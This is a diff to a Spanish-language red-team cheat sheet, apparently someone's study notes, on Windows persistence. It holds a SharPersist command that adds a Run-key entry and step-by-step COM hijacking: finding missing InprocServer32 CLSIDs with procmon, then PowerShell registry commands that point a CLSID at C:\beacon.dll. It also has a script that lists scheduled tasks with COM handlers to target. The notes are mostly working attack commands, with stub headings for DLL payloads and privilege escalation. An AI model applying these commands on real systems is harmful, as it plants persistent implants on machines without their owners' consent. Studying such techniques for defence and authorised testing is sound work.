@@ -150,7 +150,50 @@ HKCU HKLM
 execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
 
 COM Hijacking
+procmon64.exe
+En lugar de secuestrar objetos COM que están en uso y romper
+aplicaciones que dependen de ellos, una estrategia más segura es
+encontrar instancias de aplicaciones que intentan cargar objetos que en realidad no existe
+Oleview.net
 Permite la intercomunicación entre componentes de software de diferentes lenguajes
+HKEY_ CLASSES_ ROOT\CLSID y HKEY_ CLASSES_ ROOT\Interface
+HKEY_ CURRENT_ USER\ Software\Classes
+OPeraciones RegOpenKey
+NAME NOT FOUND InprocServer32
+HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
+New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
+New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
+New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
+Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
+Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
+
+OTRA FORMAS
+$Tasks = Get-ScheduledTask
+
+foreach ($Task in $Tasks)
+{
+  if ($Task.Actions.ClassId -ne $null)
+  {
+    if ($Task.Triggers.Enabled -eq $true)
+    {
+      if ($Task.Principal.GroupId -eq "Users")
+      {
+        Write-Host "Task Name: " $Task.TaskName
+        Write-Host "Task Path: " $Task.TaskPath
+        Write-Host "CLSID: " $Task.Actions.ClassId
+        Write-Host
+      }
+    }
+  }
+}
+---------
+#DLL
+Attack Windowx Executable(s) Windows DLL
+
+#EscaladePrivilegios
+execute-assembly 
+
+
 
 
 
